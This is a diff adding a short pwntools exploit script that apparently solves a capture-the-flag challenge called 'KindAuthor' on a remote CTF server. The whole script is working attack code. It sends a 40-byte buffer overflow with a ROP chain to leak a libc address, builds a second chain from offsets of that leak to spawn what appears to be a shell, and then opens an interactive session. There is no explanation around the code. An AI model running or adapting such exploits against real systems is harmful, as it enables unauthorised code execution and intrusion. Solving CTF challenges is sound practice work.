@@ -1,0 +1,13 @@
+from pwn import *
+#p=process("./KindAuthor")
+p=remote("ctf.mf.grsu.by", 9075)
+payload=b'a'*40+p64(0x000000000040114a)+p64(0x404000)+p64(0x401036)+p64(0x4011d1)
+#input()
+p.sendafter(b'data:\n',payload)
+a=u64(p.recv(6)+b'\0\0')
+print(hex(a))
+a=int(input(),16)
+payload=b'a'*40+p64(0x000000000040114a)+p64(a+1210628)+p64(0x0000000000401016)+p64(a-185488)
+#input()
+p.sendafter(b'data:\n',payload)
+p.interactive()
